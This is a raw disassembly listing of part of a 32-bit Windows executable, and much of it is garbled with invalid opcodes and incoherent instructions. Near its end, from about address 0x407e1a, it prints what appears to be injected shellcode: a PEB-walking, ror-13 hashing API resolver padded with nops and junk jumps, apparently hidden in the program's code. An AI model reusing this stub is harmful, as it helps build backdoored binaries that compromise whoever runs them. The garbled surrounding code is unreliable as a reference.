  407931:	e8 5a 6c d0 00       	call   0x110e590
  407936:	83 c4 14             	add    $0x14,%esp
  407939:	8b a4 c6 17 17 20 f8 	mov    -0x7dfe8e9(%esi,%eax,8),%esp
  407940:	9b                   	fwait
  407941:	fe                   	(bad)
  407942:	ff                   	(bad)
  407943:	ff                   	(bad)
  407944:	39 03                	cmp    %eax,(%ebx)
  407946:	83 c3 04             	add    $0x4,%ebx
  407949:	85 c0                	test   %eax,%eax
  40794b:	34 84                	xor    $0x84,%al
  40794d:	c0 00 4e             	rolb   $0x4e,(%eax)
  407950:	00 8d 12 fc 8d 55    	add    %cl,0x558dfc12(%ebp)
  407956:	ac                   	lods   %ds:(%esi),%al
  407957:	51                   	push   %ecx
  407958:	52                   	push   %edx
  407959:	50                   	push   %eax
  40795a:	e8 51 3d 00 00       	call   0x40b6b0
  40795f:	8b f0                	mov    %eax,%esi
  407961:	1b 45 e4             	sbb    -0x1c(%ebp),%eax
  407964:	83 c4 0c             	add    $0xc,%esp
  407967:	85 cb                	test   %ecx,%ebx
  407969:	01 84 ae 00 31 12 63 	add    %eax,0x63123100(%esi,%ebp,4)
  407970:	45                   	inc    %ebp
  407971:	f0 8b 4d fc          	lock mov -0x4(%ebp),%ecx
  407975:	3b c1                	cmp    %ecx,%eax
  407977:	0f 83 a0 00 00 23    	jae    0x23407a1d
  40797d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407980:	c6 45 dc 20          	movb   $0x20,-0x24(%ebp)
  407984:	e9 56 fe c5 ff       	jmp    0x677df
  407989:	8b 03                	mov    (%ebx),%eax
  40798b:	83 c3 04             	add    $0x4,%ebx
  40798e:	85 c0                	test   %eax,%eax
  407990:	74 7f                	je     0x407a11
  407992:	8d 4d 8b             	lea    -0x75(%ebp),%ecx
  407995:	8d 11                	lea    (%ecx),%edx
  407997:	ac                   	lods   %ds:(%esi),%al
  407998:	51                   	push   %ecx
  407999:	52                   	push   %edx
  40799a:	50                   	push   %eax
  40799b:	d2 80 08 ad 8f eb    	rolb   %cl,-0x147052f8(%eax)
  4079a1:	bd 8b ee 83 c3       	mov    $0xc383ee8b,%ebp
  4079a6:	04 85                	add    $0x85,%al
  4079a8:	c0 74 66 8b 10       	shlb   $0x10,-0x75(%esi,%eiz,2)
  4079ad:	1a 8d ac fd cd 7e    	sbb    0x7ecdfdac(%ebp),%cl
  4079b3:	68 ff 01 00 00       	push   $0x1ff
  4079b8:	51                   	push   %ecx
  4079b9:	bf e4 94 0d 00       	mov    $0xd94e4,%edi
  4079be:	00 8b f0 83 c9 ff    	add    %cl,-0x367c10(%ebx)
  4079c4:	14 fe                	adc    $0xfe,%al
  4079c6:	33 c0                	xor    %eax,%eax
  4079c8:	f2 ae                	repnz scas %es:(%edi),%al
  4079ca:	f7 d1                	not    %ecx
  4079cc:	bd 1c 45 17 20       	mov    $0x2017451c,%ebp
  4079d1:	89 4d 69             	mov    %ecx,0x69(%ebp)
  4079d4:	e9 06 fe ff ff       	jmp    0x4077df
  4079d9:	8b 03                	mov    (%ebx),%eax
  4079db:	71 c3                	jno    0x4079a0
  4079dd:	d2 85 c0 74 2f 8d    	rolb   %cl,-0x72d08b40(%ebp)
  4079e3:	4d                   	dec    %ebp
  4079e4:	fc                   	cld
  4079e5:	8d 55 ff             	lea    -0x1(%ebp),%edx
  4079e8:	51                   	push   %ecx
  4079e9:	f3 50                	repz push %eax
  4079eb:	e8 50 73 2e bf       	call   0xbf6eed40
  4079f0:	e9 6a 86 ff ff       	jmp    0x40005f
  4079f5:	8b 03                	mov    (%ebx),%eax
  4079f7:	83 c3 04             	add    $0x4,%ebx
  4079fa:	85 81 74 13 8d 4d    	test   %eax,0x4d8d1374(%ecx)
  407a00:	fc                   	cld
  407a01:	8d 55 ac             	lea    -0x54(%ebp),%edx
  407a04:	51                   	push   %ecx
  407a05:	52                   	push   %edx
  407a06:	50                   	push   %eax
  407a07:	e7 54                	out    %eax,$0x54
  407a09:	0c 00                	or     $0x0,%al
  407a0b:	be e9 c7 cf df       	mov    $0xdfcfc7e9,%esi
  407a10:	5f                   	pop    %edi
  407a11:	be a0 c2 40 00       	mov    $0x40c2a0,%esi
  407a16:	c7 45 d1 06 3b 00 00 	movl   $0x3b06,-0x2f(%ebp)
  407a1d:	c6 45 17 07          	movb   $0x7,0x17(%ebp)
  407a21:	e9 b9 fd ff ff       	jmp    0x4077df
  407a26:	40                   	inc    %eax
  407a27:	c3                   	ret
  407a28:	db 3c 42             	fstpt  (%edx,%eax,2)
  407a2b:	b2 2f                	mov    $0x2f,%dl
  407a2d:	8b 43 69             	mov    0x69(%ebx),%eax
  407a30:	e7 c0                	out    %eax,$0xc0
  407a32:	74 16                	je     0x407a4a
  407a34:	8b 09                	mov    (%ecx),%ecx
  407a36:	eb 14                	jmp    0x407a4c
  407a38:	3c 46                	cmp    $0x46,%al
  407a3a:	75 f1                	jne    0x407a2d
  407a3c:	8b 4b fc             	mov    -0x4(%ebx),%ecx
  407a3f:	85 c9                	test   %ecx,%ecx
  407a41:	74 07                	je     0x407a4a
  407a43:	8b 01                	mov    (%ecx),%eax
  407a45:	d1 6a 04             	shrl   $1,0x4(%edx)
  407a48:	eb 04                	jmp    0x407a4e
  407a4a:	33 c0                	xor    %eax,%eax
  407a4c:	d5 c9                	aad    $0xc9
  407a4e:	34 55                	xor    $0x55,%al
  407a50:	ac                   	lods   %ds:(%esi),%al
  407a51:	52                   	push   %edx
  407a52:	51                   	push   %ecx
  407a53:	50                   	push   %eax
  407a54:	e8 e7 02 ff ff       	call   0x3f7d40
  407a59:	1b f0                	sbb    %eax,%esi
  407a5b:	83 c9 ff             	or     $0xffffffff,%ecx
  407a5e:	8b fe                	mov    %esi,%edi
  407a60:	33 c0                	xor    %eax,%eax
  407a62:	19 ae f7 d1 49 c6    	sbb    %ebp,-0x39b62e09(%esi)
  407a68:	45                   	inc    %ebp
  407a69:	17                   	pop    %ss
  407a6a:	20 65 57             	and    %ah,0x57(%ebp)
  407a6d:	fc                   	cld
  407a6e:	28 d2                	sub    %dl,%dl
  407a70:	fd                   	std
  407a71:	ff                   	(bad)
  407a72:	ff 4a 48             	decl   0x48(%edx)
  407a75:	f4                   	hlt
  407a76:	80 96 c7 45 76 08 00 	adcb   $0x0,0x87645c7(%esi)
  407a7d:	00 00                	add    %al,(%eax)
  407a7f:	c6 45 7f 00          	movb   $0x0,0x7f(%ebp)
  407a83:	83 c3 04             	add    $0x4,%ebx
  407a86:	e9 54 fd ff ff       	jmp    0x4077df
  407a8b:	c6 45 ea 25          	movb   $0x25,-0x16(%ebp)
  407a8f:	88 4d 98             	mov    %cl,-0x68(%ebp)
  407a92:	8d                   	lea    (bad),%ebp
  407a93:	ee                   	out    %al,(%dx)
  407a94:	ea c7 45 fc 62 a6 00 	ljmp   $0xa6,$0x62fc45c7
  407a9b:	00 c6                	add    %al,%dh
  407a9d:	45                   	inc    %ebp
  407a9e:	17                   	pop    %ss
  407a9f:	20 e9                	and    %ch,%cl
  407aa1:	3a 13                	cmp    (%ebx),%dl
  407aa3:	ff ac 8b 7d 41 8b 45 	ljmp   *0x458b417d(%ebx,%ecx,4)
  407aaa:	f4                   	hlt
  407aab:	85 6a 74             	test   %ebp,0x74(%edx)
  407aae:	27                   	daa
  407aaf:	3b 45 1f             	cmp    0x1f(%ebp),%eax
  407ab2:	72 53                	jb     0x407b07
  407ab4:	15 89 07 bf 55       	adc    $0x55bf0789,%eax
  407ab9:	08 43 c4             	or     %al,-0x3c(%ebx)
  407abc:	11 85 45 0f 56 fe    	adc    %eax,-0x1a9f0bb(%ebp)
  407ac2:	00 00                	add    %al,(%eax)
  407ac4:	00 8b 97 04 8b 07    	add    %cl,0x78b0497(%ebx)
  407aca:	4d                   	dec    %ebp
  407acb:	4d                   	dec    %ebp
  407acc:	dc 8a 39 17 88 10    	fmull  0x10881739(%edx)
  407ad2:	40                   	inc    %eax
  407ad3:	89 d7                	mov    %edx,%edi
  407ad5:	f4                   	hlt
  407ad6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407ad7:	4d                   	dec    %ebp
  407ad8:	ec                   	in     (%dx),%al
  407ad9:	8b 55 fc             	mov    -0x4(%ebp),%edx
  407adc:	41                   	inc    %ecx
  407add:	15 a6 ec 9c 4d       	adc    $0x4d9ceca6,%eax
  407ae2:	e0 49                	loopne 0x407b2d
  407ae4:	3b fb                	cmp    %ebx,%edi
  407ae6:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407ae9:	77 62                	ja     0x407b4d
  407aeb:	8b 45 bc             	mov    -0x44(%ebp),%eax
  407aee:	83 f8 01             	cmp    $0x1,%eax
  407af1:	2f                   	das
  407af2:	45                   	inc    %ebp
  407af3:	f4                   	hlt
  407af4:	75 4a                	jne    0x407b40
  407af6:	cb                   	lret
  407af7:	b2 fc                	mov    $0xfc,%dl
  407af9:	85 ff                	test   %edi,%edi
  407afb:	74 43                	je     0x407b40
  407afd:	85 22                	test   %esp,(%edx)
  407aff:	74 ff                	je     0x407b00
  407b01:	33 45 1d             	xor    0x1d(%ebp),%eax
  407b04:	72 27                	jb     0x407b2d
  407b06:	8b 45 0c             	mov    0xc(%ebp),%eax
  407b09:	8b 4d 5f             	mov    0x5f(%ebp),%ecx
  407b0c:	50                   	push   %eax
  407b0d:	78 87                	js     0x407a96
  407b0f:	ff 82 08 83 c4 64    	incl   0x64c48308(%edx)
  407b15:	85 c0                	test   %eax,%eax
  407b17:	e6 85                	out    %al,$0x85
  407b19:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407b1a:	00 00                	add    %al,(%eax)
  407b1c:	00 8b 45 0c 8b 04    	add    %cl,0x48b0c45(%ebx)
  407b22:	42                   	inc    %edx
  407b23:	40                   	inc    %eax
  407b24:	58                   	pop    %eax
  407b25:	89 45 dc             	mov    %eax,-0x24(%ebp)
  407b28:	89 55 f4             	mov    %edx,-0xc(%ebp)
  407b2b:	8b c2                	mov    %edx,%eax
  407b2d:	8a 0e                	mov    (%esi),%cl
  407b2f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407b30:	08 40 89             	or     %al,-0x77(%eax)
  407b33:	45                   	inc    %ebp
  407b34:	f4                   	hlt
  407b35:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407b38:	41                   	inc    %ecx
  407b39:	46                   	inc    %esi
  407b3a:	f7 89 93 ec 75 bd 8b 	testl  $0x85cc4d8b,-0x428a136d(%ecx)
  407b41:	4d cc 85 
  407b44:	c9                   	leave
  407b45:	74 58                	je     0x407b9f
  407b47:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  407b4a:	85 e5                	test   %esp,%ebp
  407b4c:	75 cd                	jne    0x407b1b
  407b4e:	8b 55 e0             	mov    -0x20(%ebp),%edx
  407b51:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  407b54:	3b d1                	cmp    %ecx,%edx
  407b56:	ac                   	lods   %ds:(%esi),%al
  407b57:	47                   	inc    %edi
  407b58:	85 c0                	test   %eax,%eax
  407b5a:	0c 2e                	or     $0x2e,%al
  407b5c:	3b 45 dc             	cmp    -0x24(%ebp),%eax
  407b5f:	72 20                	jb     0x407b81
  407b61:	04 7d                	add    $0x7d,%al
  407b63:	0c 8b                	or     $0x8b,%al
  407b65:	63 f4                	arpl   %esi,%esp
  407b67:	57                   	push   %edi
  407b68:	ec                   	in     (%dx),%al
  407b69:	07                   	pop    %es
  407b6a:	ff 55 08             	call   *0x8(%ebp)
  407b6d:	83 c4 04             	add    $0x4,%esp
  407b70:	33 c8                	xor    %eax,%ecx
  407b72:	28 4f 8b             	sub    %cl,-0x75(%edi)
  407b75:	0f 8b 57 04 89 4d    	jnp    0x4dc97fd2
  407b7b:	eb 51                	jmp    0x407bce
  407b7d:	55                   	push   %ebp
  407b7e:	b9 d3 c1 4b d1       	mov    $0xd14bc1d3,%ecx
  407b83:	17                   	pop    %ss
  407b84:	88 08                	mov    %cl,(%eax)
  407b86:	40                   	inc    %eax
  407b87:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407b8a:	bf 4d 4b 38 55       	mov    $0x55384b4d,%edi
  407b8f:	fc                   	cld
  407b90:	15 89 4d c7 8b       	adc    $0x8bc74d89,%eax
  407b95:	4d                   	dec    %ebp
  407b96:	e0 18                	loopne 0x407bb0
  407b98:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407b99:	ca 89 4d             	lret   $0x4d89
  407b9c:	e0 77                	loopne 0x407c15
  407b9e:	b9 09 96 10 8b       	mov    $0x8b109609,%ecx
  407ba3:	55                   	push   %ebp
  407ba4:	10 8a 02 84 c0 0f    	adc    %cl,0xfc08402(%edx)
  407baa:	85 5c f5 ff          	test   %ebx,-0x1(%ebp,%esi,8)
  407bae:	ff 8b 4d 0c 8b 45    	decl   0x458b0c4d(%ebx)
  407bb4:	f4                   	hlt
  407bb5:	5f                   	pop    %edi
  407bb6:	89 01                	mov    %eax,(%ecx)
  407bb8:	8b 9c ec 5e 5b 8b e5 	mov    -0x1a74a4a2(%esp,%ebp,8),%ebx
  407bbf:	5d                   	pop    %ebp
  407bc0:	27                   	daa
  407bc1:	10 c0                	adc    %al,%al
  407bc3:	5f                   	pop    %edi
  407bc4:	5e                   	pop    %esi
  407bc5:	83 37 ff             	xorl   $0xffffffff,(%edi)
  407bc8:	63 fa                	arpl   %edi,%edx
  407bca:	e5 5d                	in     $0x5d,%eax
  407bcc:	aa                   	stos   %al,%es:(%edi)
  407bcd:	f3 00 12             	repz add %dl,(%edx)
  407bd0:	a2 7b 40 e9 7d       	mov    %al,0x7de9407b
  407bd5:	78 40                	js     0x407c17
  407bd7:	00 95 76 40 00 07    	add    %dl,0x7004076(%ebp)
  407bdd:	77 40                	ja     0x407c1f
  407bdf:	00 8d 75 40 00 62    	add    %cl,0x62004075(%ebp)
  407be5:	78 40                	js     0x407c27
  407be7:	00 54 8e 40          	add    %dl,0x40(%esi,%ecx,4)
  407beb:	b7 94                	mov    $0x94,%bh
  407bed:	78 40                	js     0x407c2f
  407bef:	00 90 74 d7 00 fb    	add    %dl,-0x4ff288c(%eax)
  407bf5:	78 20                	js     0x407c17
  407bf7:	00 a7 76 40 00 bd    	add    %ah,-0x42ffbf8a(%edi)
  407bfd:	73 2a                	jae    0x407c29
  407bff:	00 7d dd             	add    %bh,-0x23(%ebp)
  407c02:	40                   	inc    %eax
  407c03:	00 00                	add    %al,(%eax)
  407c05:	0c 0c                	or     $0xc,%al
  407c07:	0c b0                	or     $0xb0,%al
  407c09:	54                   	push   %esp
  407c0a:	0c b7                	or     $0xb7,%al
  407c0c:	0c 0c                	or     $0xc,%al
  407c0e:	0c 0c                	or     $0xc,%al
  407c10:	0c 0c                	or     $0xc,%al
  407c12:	0c 0c                	or     $0xc,%al
  407c14:	73 0c                	jae    0x407c22
  407c16:	0c 6a                	or     $0x6a,%al
  407c18:	0c 0c                	or     $0xc,%al
  407c1a:	0c 0c                	or     $0xc,%al
  407c1c:	0c 0c                	or     $0xc,%al
  407c1e:	0c 0c                	or     $0xc,%al
  407c20:	0c 0c                	or     $0xc,%al
  407c22:	0c 0c                	or     $0xc,%al
  407c24:	0c fa                	or     $0xfa,%al
  407c26:	0c 0c                	or     $0xc,%al
  407c28:	0c 01                	or     $0x1,%al
  407c2a:	0c 0c                	or     $0xc,%al
  407c2c:	1c 0c                	sbb    $0xc,%al
  407c2e:	58                   	pop    %eax
  407c2f:	0c 0c                	or     $0xc,%al
  407c31:	9e                   	sahf
  407c32:	9c                   	pushf
  407c33:	0c 0c                	or     $0xc,%al
  407c35:	0c 0c                	or     $0xc,%al
  407c37:	0c 0c                	or     $0xc,%al
  407c39:	0c da                	or     $0xda,%al
  407c3b:	38 0c 0c             	cmp    %cl,(%esp,%ecx,1)
  407c3e:	33 0c 0c             	xor    (%esp,%ecx,1),%ecx
  407c41:	0c 0c                	or     $0xc,%al
  407c43:	80 0c 0c 0c          	orb    $0xc,(%esp,%ecx,1)
  407c47:	0c ef                	or     $0xef,%al
  407c49:	02 11                	add    (%ecx),%dl
  407c4b:	03 0c 0c             	add    (%esp,%ecx,1),%ecx
  407c4e:	0a 0c 0c             	or     (%esp,%ecx,1),%cl
  407c51:	0c 0c                	or     $0xc,%al
  407c53:	7a 0c                	jp     0x407c61
  407c55:	0c 0c                	or     $0xc,%al
  407c57:	0c 0c                	or     $0xc,%al
  407c59:	0c 0c                	or     $0xc,%al
  407c5b:	0c 04                	or     $0x4,%al
  407c5d:	0c 0c                	or     $0xc,%al
  407c5f:	0c 0c                	or     $0xc,%al
  407c61:	eb c2                	jmp    0x407c25
  407c63:	d7                   	xlat   %ds:(%ebx)
  407c64:	7b 0c                	jnp    0x407c72
  407c66:	2d 05 06 02 4f       	sub    $0x4f020605,%eax
  407c6b:	03 0c 06             	add    (%esi,%eax,1),%ecx
  407c6e:	0c 0c                	or     $0xc,%al
  407c70:	0c 0c                	or     $0xc,%al
  407c72:	07                   	pop    %es
  407c73:	08 09                	or     %cl,(%ecx)
  407c75:	0c 50                	or     $0x50,%al
  407c77:	0a 0c 0b             	or     (%ebx,%ecx,1),%cl
  407c7a:	40                   	inc    %eax
  407c7b:	fb                   	sti
  407c7c:	31 71 b9             	xor    %esi,-0x47(%ecx)
  407c7f:	00 a2 7b 40 00 89    	add    %ah,-0x76ffbf85(%edx)
  407c85:	79 40                	jns    0x407cc7
  407c87:	00 ca                	add    %cl,%dl
  407c89:	7a 40                	jp     0x407ccb
  407c8b:	00 0c d1             	add    %cl,(%ecx,%edx,8)
  407c8e:	40                   	inc    %eax
  407c8f:	00 36                	add    %dh,(%esi)
  407c91:	ba 40 00 a2 79       	mov    $0x79a20040,%edx
  407c96:	40                   	inc    %eax
  407c97:	00 1f                	add    %bl,(%edi)
  407c99:	05 40 00 f5 0f       	add    $0xff50040,%eax
  407c9e:	40                   	inc    %eax
  407c9f:	97                   	xchg   %eax,%edi
  407ca0:	73 7a                	jae    0x407d1c
  407ca2:	f7 00 00 08 08 6f    	testl  $0x6f080800,(%eax)
  407ca8:	08 b2 08 08 08 b9    	or     %dh,-0x46f7f7f8(%edx)
  407cae:	08 08                	or     %cl,(%eax)
  407cb0:	08 08                	or     %cl,(%eax)
  407cb2:	08 08                	or     %cl,(%eax)
  407cb4:	08 08                	or     %cl,(%eax)
  407cb6:	08 08                	or     %cl,(%eax)
  407cb8:	08 08                	or     %cl,(%eax)
  407cba:	08 12                	or     %dl,(%edx)
  407cbc:	08 b5 75 08 bb 08    	or     %dh,0x8bb0875(%ebp)
  407cc2:	08 08                	or     %cl,(%eax)
  407cc4:	08 08                	or     %cl,(%eax)
  407cc6:	08 08                	or     %cl,(%eax)
  407cc8:	9d                   	popf
  407cc9:	49                   	dec    %ecx
  407cca:	08 08                	or     %cl,(%eax)
  407ccc:	bd 08 08 08 08       	mov    $0x8080808,%ebp
  407cd1:	08 08                	or     %cl,(%eax)
  407cd3:	56                   	push   %esi
  407cd4:	08 08                	or     %cl,(%eax)
  407cd6:	08 08                	or     %cl,(%eax)
  407cd8:	08 08                	or     %cl,(%eax)
  407cda:	04 f5                	add    $0xf5,%al
  407cdc:	38 08                	cmp    %cl,(%eax)
  407cde:	08 07                	or     %al,(%edi)
  407ce0:	c2 08 72             	ret    $0x7208
  407ce3:	08 08                	or     %cl,(%eax)
  407ce5:	01 02                	add    %eax,(%edx)
  407ce7:	08 f3                	or     %dh,%bl
  407ce9:	08 02                	or     %al,(%edx)
  407ceb:	08 08                	or     %cl,(%eax)
  407ced:	03 08                	add    (%eax),%ecx
  407cef:	08 08                	or     %cl,(%eax)
  407cf1:	08 36                	or     %dh,(%esi)
  407cf3:	08 08                	or     %cl,(%eax)
  407cf5:	08 61 02             	or     %ah,0x2(%ecx)
  407cf8:	04 08                	add    $0x8,%al
  407cfa:	38 08                	cmp    %cl,(%eax)
  407cfc:	08 08                	or     %cl,(%eax)
  407cfe:	08 08                	or     %cl,(%eax)
  407d00:	08 08                	or     %cl,(%eax)
  407d02:	6d                   	insl   (%dx),%es:(%edi)
  407d03:	d1 08                	rorl   $1,(%eax)
  407d05:	ad                   	lods   %ds:(%esi),%eax
  407d06:	92                   	xchg   %eax,%edx
  407d07:	08 08                	or     %cl,(%eax)
  407d09:	08 08                	or     %cl,(%eax)
  407d0b:	08 61 08             	or     %ah,0x8(%ecx)
  407d0e:	7c 2f                	jl     0x407d3f
  407d10:	08 05 08 08 c5 08    	or     %al,0x8c50808
  407d16:	08 08                	or     %cl,(%eax)
  407d18:	b3 90                	mov    $0x90,%bl
  407d1a:	90                   	nop
  407d1b:	90                   	nop
  407d1c:	90                   	nop
  407d1d:	90                   	nop
  407d1e:	90                   	nop
  407d1f:	90                   	nop
  407d20:	55                   	push   %ebp
  407d21:	8b ec                	mov    %esp,%ebp
  407d23:	8e ec                	mov    %esp,%gs
  407d25:	58                   	pop    %eax
  407d26:	56                   	push   %esi
  407d27:	ee                   	out    %al,(%dx)
  407d28:	e4 a8                	in     $0xa8,%al
  407d2a:	57                   	push   %edi
  407d2b:	8b b6 10 32 4d fc    	mov    -0x3b2cdf0(%esi),%esi
  407d31:	50                   	push   %eax
  407d32:	14 45                	adc    $0x45,%al
  407d34:	0c 8d                	or     $0x8d,%al
  407d36:	55                   	push   %ebp
  407d37:	0c 90                	or     $0x90,%al
  407d39:	8b 4d 37             	mov    0x37(%ebp),%ecx
  407d3c:	81 57 50 a1 e8 7b 01 	adcl   $0x17be8a1,0x50(%edi)
  407d43:	00 00                	add    %al,(%eax)
  407d45:	ea 4d fc 3f 55 68 83 	ljmp   $0x8368,$0x553ffc4d
  407d4c:	20 18                	and    %bl,(%eax)
  407d4e:	89 c8                	mov    %ecx,%eax
  407d50:	f8                   	clc
  407d51:	a9 c9 8b f2 74       	test   $0x74f28bc9,%eax
  407d56:	06                   	push   %es
  407d57:	c6 02 2d             	movb   $0x2d,(%edx)
  407d5a:	8d 72 5e             	lea    0x5e(%edx),%esi
  407d5d:	8d 4f ff             	lea    -0x1(%edi),%ecx
  407d60:	53                   	push   %ebx
  407d61:	85 f9                	test   %edi,%ecx
  407d63:	7e 0f                	jle    0x407d74
  407d65:	80 3c 01 3d          	cmpb   $0x3d,(%ecx,%eax,1)
  407d69:	75 dc                	jne    0x407d47
  407d6b:	4f                   	dec    %edi
  407d6c:	49                   	dec    %ecx
  407d6d:	58                   	pop    %eax
  407d6e:	c9                   	leave
  407d6f:	7f f4                	jg     0x407d65
  407d71:	89 7d 10             	mov    %edi,0x10(%ebp)
  407d74:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  407d77:	85 db                	test   %ebx,%ebx
  407d79:	0f 8c b4 00 00 00    	jl     0x407e33
  407d7f:	8b 84 2b 7c 83 f9 04 	mov    0x4f9837c(%ebx,%ebp,1),%eax
  407d86:	0f 8f b0 00 00 84    	jg     0x84407e3c
  407d8c:	85 db                	test   %ebx,%ebx
  407d8e:	13 3b                	adc    (%ebx),%edi
  407d90:	80 38 30             	cmpb   $0x30,(%eax)
  407d93:	74 04                	je     0x407d99
  407d95:	c6 06 2e             	movb   $0x2e,(%esi)
  407d98:	46                   	inc    %esi
  407d99:	33 db                	xor    %ebx,%ebx
  407d9b:	7d 2e                	jge    0x407dcb
  407d9d:	8b cb                	mov    %ebx,%ecx
  407d9f:	b8 d7 30 30 30       	mov    $0x303030d7,%eax
  407da4:	f7 d9                	neg    %ecx
  407da6:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  407da9:	8b 3f                	mov    (%edi),%edi
  407dab:	8b 33                	mov    (%ebx),%esi
  407dad:	c1 e9 1d             	shr    $0x1d,%ecx
  407db0:	f3 ab                	rep stos %eax,%es:(%edi)
  407db2:	b5 3c                	mov    $0x3c,%ch
  407db4:	83 84 03 f3 aa 8b 7d 	addl   $0x10,0x7d8baaf3(%ebx,%eax,1)
  407dbb:	10 
  407dbc:	8b 3f                	mov    (%edi),%edi
  407dbe:	8b 55 14             	mov    0x14(%ebp),%edx
  407dc1:	1c 9f                	sbb    $0x9f,%al
  407dc3:	03 f0                	add    %eax,%esi
  407dc5:	8b 45 c2             	mov    -0x3e(%ebp),%eax
  407dc8:	89 de                	mov    %ebx,%esi
  407dca:	0c b9                	or     $0xb9,%al
  407dcc:	01 00                	add    %eax,(%eax)
  407dce:	99                   	cltd
  407dcf:	3b 3b                	cmp    (%ebx),%edi
  407dd1:	f9                   	stc
  407dd2:	7c b6                	jl     0x407d8a
  407dd4:	8a ce                	mov    %dh,%cl
  407dd6:	88 16                	mov    %dl,(%esi)
  407dd8:	e0 40                	loopne 0x407e1a
  407dda:	0e                   	push   %cs
  407ddb:	cb                   	lret
  407ddc:	75 04                	jne    0x407de2
  407dde:	c6 06 2e             	movb   $0x2e,(%esi)
  407de1:	46                   	inc    %esi
  407de2:	41                   	inc    %ecx
  407de3:	3b cf                	cmp    %edi,%ecx
  407de5:	7e 26                	jle    0x407e0d
  407de7:	39 55 90             	cmp    %edx,-0x70(%ebp)
  407dea:	eb 0c                	jmp    0x407df8
  407dec:	84 81 82 78 ee 0f    	test   %al,0xfee7882(%ecx)
  407df2:	f9                   	stc
  407df3:	a3 85 08 27 47       	mov    %eax,0x47270885
  407df8:	fc                   	cld
  407df9:	e8 bd 02 00 00       	call   0x4080bb
  407dfe:	eb 0e                	jmp    0x407e0e
  407e00:	05 c0 d7 bd 6d       	add    $0x6dbdd7c0,%eax
  407e05:	ed                   	in     (%dx),%eax
  407e06:	a0 89 d6 ea 84       	mov    0x84ead689,%al
  407e0b:	02 e3                	add    %bl,%ah
  407e0d:	b1 90                	mov    $0x90,%cl
  407e0f:	eb 09                	jmp    0x407e1a
  407e11:	44                   	inc    %esp
  407e12:	e5 02                	in     $0x2,%eax
  407e14:	05 a6 6b 7b 45       	add    $0x457b6ba6,%eax
  407e19:	4a                   	dec    %edx
  407e1a:	60                   	pusha
  407e1b:	90                   	nop
  407e1c:	89 e5                	mov    %esp,%ebp
  407e1e:	31 d2                	xor    %edx,%edx
  407e20:	90                   	nop
  407e21:	eb 09                	jmp    0x407e2c
  407e23:	dc 21                	fsubl  (%ecx)
  407e25:	bf 82 9c 6b 89       	mov    $0x896b9c82,%edi
  407e2a:	07                   	pop    %es
  407e2b:	d1 64 8b 52          	shll   $1,0x52(%ebx,%ecx,4)
  407e2f:	30 8b 52 0c 90 eb    	xor    %cl,-0x146ff3ae(%ebx)
  407e35:	0b 24 fc             	or     (%esp,%edi,8),%esp
  407e38:	1b 5a b4             	sbb    -0x4c(%edx),%ebx
  407e3b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407e3c:	4c                   	dec    %esp
  407e3d:	20 0e                	and    %cl,(%esi)
  407e3f:	ac                   	lods   %ds:(%esi),%al
  407e40:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407e41:	8b 52 14             	mov    0x14(%edx),%edx
  407e44:	90                   	nop
  407e45:	0f b7 4a 26          	movzwl 0x26(%edx),%ecx
  407e49:	eb 0d                	jmp    0x407e58
  407e4b:	8f 86 1f 1f c9 36    	pop    0x36c91f1f(%esi)
  407e51:	11 b5 7a 6c 11 a0    	adc    %esi,-0x5fee9386(%ebp)
  407e57:	03 31                	add    (%ecx),%esi
  407e59:	ff 8b 72 28 90 eb    	decl   -0x146fd78e(%ebx)
  407e5f:	08 e4                	or     %ah,%ah
  407e61:	c8 e4 08 0e          	enter  $0x8e4,$0xe
  407e65:	be e4 18 31 c0       	mov    $0xc03118e4,%esi
  407e6a:	90                   	nop
  407e6b:	ac                   	lods   %ds:(%esi),%al
  407e6c:	90                   	nop
  407e6d:	3c 61                	cmp    $0x61,%al
  407e6f:	7c 11                	jl     0x407e82
  407e71:	90                   	nop
  407e72:	eb 0c                	jmp    0x407e80
  407e74:	0d 01 88 33 18       	or     $0x18338801,%eax
  407e79:	db c2                	fcmovnb %st(2),%st
  407e7b:	94                   	xchg   %eax,%esp
  407e7c:	84 64 42 76          	test   %ah,0x76(%edx,%eax,2)
  407e80:	2c 20                	sub    $0x20,%al
  407e82:	c1 cf 0d             	ror    $0xd,%edi
  407e85:	eb 09                	jmp    0x407e90
  407e87:	b8 ff 4c 95 65       	mov    $0x65954cff,%eax
  407e8c:	87 65 43             	xchg   %esp,0x43(%ebp)
  407e8f:	53                   	push   %ebx
  407e90:	01 c7                	add    %eax,%edi
  407e92:	90                   	nop
  407e93:	49                   	dec    %ecx
  407e94:	90                   	nop
  407e95:	75 c6                	jne    0x407e5d
  407e97:	90                   	nop
  407e98:	90                   	nop
  407e99:	52                   	push   %edx
  407e9a:	57                   	push   %edi
  407e9b:	eb 0c                	jmp    0x407ea9
  407e9d:	1c 22                	sbb    $0x22,%al
  407e9f:	56                   	push   %esi
  407ea0:	f8                   	clc
  407ea1:	b2 79                	mov    $0x79,%dl
  407ea3:	49                   	dec    %ecx
  407ea4:	e4 36                	in     $0x36,%al
  407ea6:	67 80 5a 8b 52       	sbbb   $0x52,-0x75(%bp,%si)
  407eab:	10 8b 42 3c 90 01    	adc    %cl,0x1903c42(%ebx)
  407eb1:	d0 eb                	shr    $1,%bl
  407eb3:	0a ab 86 6e 97 39    	or     0x39976e86(%ebx),%ch
  407eb9:	71 72                	jno    0x407f2d
  407ebb:	21 62 a9             	and    %esp,-0x57(%edx)
  407ebe:	8b 40 78             	mov    0x78(%eax),%eax
  407ec1:	85 c0                	test   %eax,%eax
  407ec3:	90                   	nop
  407ec4:	0f 84 d5 01 00 00    	je     0x40809f
  407eca:	90                   	nop
  407ecb:	eb 0b                	jmp    0x407ed8
  407ecd:	5d                   	pop    %ebp
  407ece:	56                   	push   %esi
  407ecf:	6a 46                	push   $0x46
  407ed1:	03 cd                	add    %ebp,%ecx
  407ed3:	1c d0                	sbb    $0xd0,%al
